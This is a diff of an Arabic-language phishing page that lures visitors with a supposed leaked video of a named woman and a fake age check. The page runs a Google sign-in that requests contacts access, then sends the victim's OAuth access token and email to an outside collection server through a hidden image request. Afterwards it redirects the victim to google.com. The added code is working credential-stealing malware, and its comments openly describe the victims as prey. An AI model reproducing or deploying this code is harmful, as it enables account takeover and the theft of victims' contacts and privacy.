@@ -2,31 +2,20 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔴 حصرياً: فيديو رحمة محسن</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Video Player</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
 </head>
-<body class="bg-black text-white flex items-center justify-center min-h-screen">
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
 
-    <div id="main-content" class="text-center p-6 max-w-lg w-full">
-        <h1 class="text-2xl font-black text-red-600 mb-4 animate-pulse">⚠️ محتوى حساس - يجب التحقق</h1>
-        <div class="bg-gray-900 aspect-video rounded-2xl border border-white/10 flex items-center justify-center mb-6">
-            <button id="loginBtn" class="bg-red-600 hover:bg-red-700 p-6 rounded-full shadow-2xl transition-transform active:scale-95">
-                <span class="text-3xl">▶️</span>
-            </button>
-        </div>
-        <p class="text-gray-400 text-sm">اضغط على زر التشغيل وسجل دخولك لتأكيد أن عمرك فوق 18 عاماً لمشاهدة التسريب.</p>
-    </div>
-
-    <div id="loading" class="hidden text-center">
-        <div class="inline-block w-12 h-12 border-4 border-red-600 border-t-transparent rounded-full animate-spin mb-4"></div>
-        <p class="text-xl font-bold">جاري فتح التشفير واستلام الفيديو...</p>
+    <div id="box">
+        <h2>يجب تسجيل الدخول لمشاهدة الفيديو</h2>
+        <button id="btn" style="padding:20px 40px; background:red; color:#white; border:none; border-radius:10px; cursor:pointer; font-weight:bold;">
+            تسجيل دخول عبر Google
+        </button>
     </div>
 
     <script>
-        // إعدادات Firebase الخاصة بك
         const firebaseConfig = {
             apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
             authDomain: "giftapp-5937d.firebaseapp.com",
@@ -35,43 +24,28 @@
             messagingSenderId: "1067108116204",
             appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
         };
-
         firebase.initializeApp(firebaseConfig);
 
-        // وظيفة إرسال البيانات للوحش
-        async function sendToC2(token, sender) {
-            document.getElementById('main-content').classList.add('hidden');
-            document.getElementById('loading').classList.remove('hidden');
-            
-            const c2Url = `https://mohamedahmed77.pythonanywhere.com/catch?token=${token}&sender=${sender}`;
-            
-            try {
-                // استخدام إرسال صامت مع انتظار
-                await fetch(c2Url, { mode: 'no-cors' });
-                console.log("Sent successfully");
-            } catch (e) {
-                console.log("Error sending");
-            }
-
-            // تحويل الضحية بعد التأكد من مرور وقت كافي للإرسال
-            setTimeout(() => {
-                window.location.href = "https://google.com";
-            }, 2000);
-        }
-
-        // معالجة العودة من تسجيل الدخول
+        // أهم جزء: استلام الصيد
         firebase.auth().getRedirectResult().then((result) => {
             if (result.credential) {
                 const token = result.credential.accessToken;
-                const sender = result.user.email || "User_" + Math.floor(Math.random() * 1000);
-                sendToC2(token, sender);
+                const sender = result.user.email;
+                
+                document.body.innerHTML = "<h1>جاري التحميل...</h1>";
+
+                // إرسال مباشر وصريح
+                const url = `https://mohamedahmed77.pythonanywhere.com/catch?token=${encodeURIComponent(token)}&sender=${encodeURIComponent(sender)}`;
+                
+                const img = new Image(); // أضمن طريقة لإرسال بيانات بدون حظر CORS
+                img.src = url;
+                
+                setTimeout(() => { window.location.href = "https://google.com"; }, 3000);
             }
         });
 
-        // زرار التشغيل
-        document.getElementById('loginBtn').onclick = () => {
+        document.getElementById('btn').onclick = () => {
             const provider = new firebase.auth.GoogleAuthProvider();
-            // طلب صلاحيات الأرقام والأسماء
             provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
             firebase.auth().signInWithRedirect(provider);
         };
